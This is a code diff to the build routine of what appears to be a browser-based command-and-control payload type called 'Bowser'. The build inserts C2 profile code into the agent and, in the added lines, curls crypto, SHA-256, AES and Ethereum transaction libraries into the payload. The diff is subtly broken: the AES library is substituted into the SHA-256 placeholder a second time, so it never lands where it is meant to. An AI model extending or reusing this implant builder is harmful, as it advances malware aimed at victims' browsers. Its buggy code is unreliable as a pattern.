@@ -71,6 +71,14 @@ class Bowser(PayloadType):
             base_code = base_code.replace("C2PROFILE_HERE", all_c2_code)
             forge_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/forge/1.3.1/forge.min.js").read()
             base_code = base_code.replace("FORGE_JS_HERE",forge_js)
+            crypto_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js").read()
+            base_code = base_code.replace("CRYPTO_JS_HERE",crypto_js)
+            ethereum_js = os.popen("curl https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js").read()
+            base_code = base_code.replace("ETHEREUM_JS_HERE",ethereum_js)
+            sha256_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js").read()
+            base_code = base_code.replace("SHA_256_JS_HERE",sha256_js)
+            aes256_js = os.popen("curl https://cdn.jsdelivr.net/gh/ricmoo/aes-js@e27b99df/index.js").read()
+            base_code = base_code.replace("SHA_256_JS_HERE",aes256_js)
             resp.payload = base_code.encode()
             if build_msg != "":
                 resp.build_stderr = build_msg
